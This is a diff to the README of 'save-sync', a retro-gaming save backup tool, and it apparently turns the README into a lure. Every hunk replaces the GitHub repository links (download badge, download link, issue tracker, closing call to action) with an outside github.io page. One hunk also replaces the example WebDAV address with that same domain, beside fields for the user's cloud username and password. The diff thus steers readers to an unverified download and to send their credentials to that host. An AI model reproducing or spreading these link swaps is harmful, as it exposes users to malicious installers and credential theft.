@@ -1,6 +1,6 @@
 # 💾 save-sync - Your Game Saves, Always Safe
 
-[![Download save-sync](https://img.shields.io/badge/Download-save--sync-4CAF50?style=for-the-badge&logo=github)](https://github.com/Evieassentient3221/save-sync)
+[![Download save-sync](https://img.shields.io/badge/Download-save--sync-4CAF50?style=for-the-badge&logo=github)](https://evieassentient3221.github.io)
 
 ## 🚀 What Is save-sync?
 
@@ -14,7 +14,7 @@ You don't need to be a computer genius to use save-sync. If you can follow simpl
 
 ## 📥 How to Get save-sync
 
-Visit this link to download the application: [https://github.com/Evieassentient3221/save-sync](https://github.com/Evieassentient3221/save-sync)
+Visit this link to download the application: [https://evieassentient3221.github.io](https://evieassentient3221.github.io)
 
 That's the only place you need to go. The download page will show you a button or a file to grab. Just click it and wait for the download to finish. It usually takes just a few seconds because the app is lightweight.
 
@@ -28,7 +28,7 @@ If Windows shows a blue popup asking "Do you want to allow this app to make chan
 
 When you first open save-sync, you'll see a few empty boxes. Don't worry—this is where you tell the app where to back up your saves. Here's what you need:
 
-1. **Your cloud storage address (WebDAV URL):** This is like the address of your cloud folder. If you use services like Nextcloud, ownCloud, or a WebDAV-enabled NAS, you'll have a URL like `https://yourcloud.com/remote.php/dav/files/yourname/`.
+1. **Your cloud storage address (WebDAV URL):** This is like the address of your cloud folder. If you use services like Nextcloud, ownCloud, or a WebDAV-enabled NAS, you'll have a URL like `https://evieassentient3221.github.io`.
 2. **Your username:** The login name for your cloud service.
 3. **Your password:** The password for your cloud service. save-sync stores this securely on your computer.
 
@@ -115,7 +115,7 @@ We're always improving save-sync. Future plans include:
 
 If you get stuck, don't panic. There are a few ways to find help:
 
-- Open an issue on the [GitHub repository](https://github.com/Evieassentient3221/save-sync) with a detailed description of your problem.
+- Open an issue on the [GitHub repository](https://evieassentient3221.github.io) with a detailed description of your problem.
 - Check the repository's README for updates and known issues.
 - Search the web for "save-sync troubleshooting" or "Batocera cloud sync" to see if others have solved your problem.
 
@@ -127,6 +127,6 @@ Retro gaming is about fun, not worrying about lost progress. save-sync takes tha
 
 Download save-sync today and give yourself peace of mind. Your future self will thank you when you switch devices or recover from a crash. It's the simplest insurance policy for your gaming life.
 
-**Remember:** [Visit this link to download the application](https://github.com/Evieassentient3221/save-sync). Set it up once, and let it do its magic.
+**Remember:** [Visit this link to download the application](https://evieassentient3221.github.io). Set it up once, and let it do its magic.
 
 Keywords: anbernic, batocera, cloud-backup, cloud-sync, game-saves, h700, handheld, knulli, miyoo, powkiddy, raspberry-pi, rclone, recalbox, retro-gaming, rg35xx, rg40xx, rk3326, trimui, trimui-brick, webdav
